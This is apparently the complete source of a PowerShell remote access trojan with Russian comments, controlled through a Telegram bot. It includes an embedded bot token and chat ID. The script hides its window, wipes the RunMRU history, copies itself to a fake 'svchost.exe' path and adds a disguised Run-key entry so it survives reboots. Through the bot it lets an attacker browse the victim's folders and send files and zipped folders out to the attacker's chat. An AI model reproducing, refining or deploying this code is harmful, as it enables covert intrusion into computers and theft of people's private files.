# RAT через Telegram Bot - ПОЛНОСТЬЮ СКРЫТАЯ ВЕРСИЯ ДЛЯ WINDOWS 11
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Установка кодировки UTF-8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# Полное скрытие окна PowerShell для Windows 11
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Дополнительные методы скрытия
try {
    $processId = [System.Diagnostics.Process]::GetCurrentProcess().Id
    $process = Get-Process -Id $processId
    $process.PriorityClass = 'Idle'
} catch { }

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Очистка истории RUN при запуске
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# Функция отправки сообщений
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
    } catch { }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# Функция отправки файлов
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch { }
}

# Функция создания ZIP архива
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        return $false
    }
}

# Функция очистки RAT
function Invoke-Cleanup {
    Send-Telegram "🔍 Начинается полная очистка RAT..."

    # 1. Завершаем процессы RAT
    Send-Telegram "🔄 Этап 1: Завершение процессов RAT"
    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
        try {
            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($_.Id)").CommandLine
            if ($cmdLine -like "*8429674512*" -or $cmdLine -like "*System32Logs*") {
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            }
        } catch { }
    }

    # 2. Удаляем файлы RAT
    Send-Telegram "🔄 Этап 2: Удаление файлов RAT"
    $filesToDelete = @(
        "$env:APPDATA\Microsoft\Windows\System32Logs\svchost.exe",
        "$env:TEMP\windows_update.marker"
    )

    $deletedFiles = @()
    foreach ($file in $filesToDelete) {
        if (Test-Path $file) {
            try {
                Remove-Item $file -Force -ErrorAction SilentlyContinue
                $deletedFiles += $file
            } catch { }
        }
    }

    # 3. Очищаем автозагрузку реестра
    Send-Telegram "🔄 Этап 3: Очистка реестра"
    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    )

    $regEntries = @()
    foreach ($regPath in $regPaths) {
        try {
            Remove-ItemProperty -Path $regPath -Name "System32 Logs Service" -Force -ErrorAction SilentlyContinue
            $regEntries += "$regPath\System32 Logs Service"
        } catch { }
    }

    # 4. Очищаем историю RUN
    Send-Telegram "🔄 Этап 4: Очистка истории RUN"
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

    # 5. Финальный отчет
    $report = "✅ ОЧИСТКА RAT ЗАВЕРШЕНА"
    if ($deletedFiles.Count -gt 0) {
        $report += "`nУдаленные файлы:`n$($deletedFiles -join "`n")"
    }
    if ($regEntries.Count -gt 0) {
        $report += "`nУдаленные записи реестра:`n$($regEntries -join "`n")"
    }
    
    Send-Telegram $report
    return $true
}

# Автоматическая установка при первом запуске
$installMarker = "$env:TEMP\windows_update.marker"
$hiddenFolder = "$env:APPDATA\Microsoft\Windows\System32Logs"
$scriptPath = "$hiddenFolder\svchost.exe"

if (!(Test-Path $installMarker)) {
    # Создаем маркер установки
    "Installed $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8 -ErrorAction SilentlyContinue
    
    # Создаем скрытую папку
    if (!(Test-Path $hiddenFolder)) { 
        New-Item -Path $hiddenFolder -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    }
    
    # Копируем текущий скрипт
    try {
        $currentScript = Get-Content -LiteralPath $MyInvocation.MyCommand.Path -Raw -ErrorAction SilentlyContinue
        if ($currentScript) {
            $currentScript | Out-File -FilePath $scriptPath -Encoding UTF8 -ErrorAction SilentlyContinue
        }
    } catch {
        # Альтернативный метод получения скрипта
        try {
            $currentScript = Get-Content -Path $PSCommandPath -Raw -ErrorAction SilentlyContinue
            $currentScript | Out-File -FilePath $scriptPath -Encoding UTF8 -ErrorAction SilentlyContinue
        } catch { }
    }
    
    # Добавляем в автозагрузку
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (!(Test-Path $regPath)) { 
        New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null 
    }
    
    Set-ItemProperty -Path $regPath -Name "System32 Logs Service" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
    
    # Запускаем скрытую копию
    if (Test-Path $scriptPath) {
        Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
        exit
    }
}

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""
$global:LastUpdateId = 0

# Отправка информации о запуске
Send-Telegram "RAT активирован на $env:COMPUTERNAME
Доступные команды:
/help - список команд
/ls - список файлов
/cd [папка] - сменить директорию
/download [файл] - скачать файл
/destroy - самоуничтожение"

# Основной цикл опроса
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "Доступные команды:
/help - показать это сообщение
/ls - список файлов в текущей директории
/cd [папка] - сменить директорию
/download [файл] - скачать файл или папку
/destroy - самоуничтожение RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "Содержимое $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "Ошибка архивации папки: $target"
                                    }
                                } else {
                                    Send-Telegram "Файл $target отправлен" $fullPath
                                }
                            } else {
                                Send-Telegram "Файл/папка не найдены: $target"
                            }
                        }
                        "^/destroy$" {
                            Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                            $cleanupResult = Invoke-Cleanup
                            if ($cleanupResult) {
                                Start-Sleep -Seconds 2
                                Stop-Process -Id $pid -Force
                            }
                        }
                    }
                }
            }
        }
    } catch { }
    Start-Sleep -Seconds 2
}
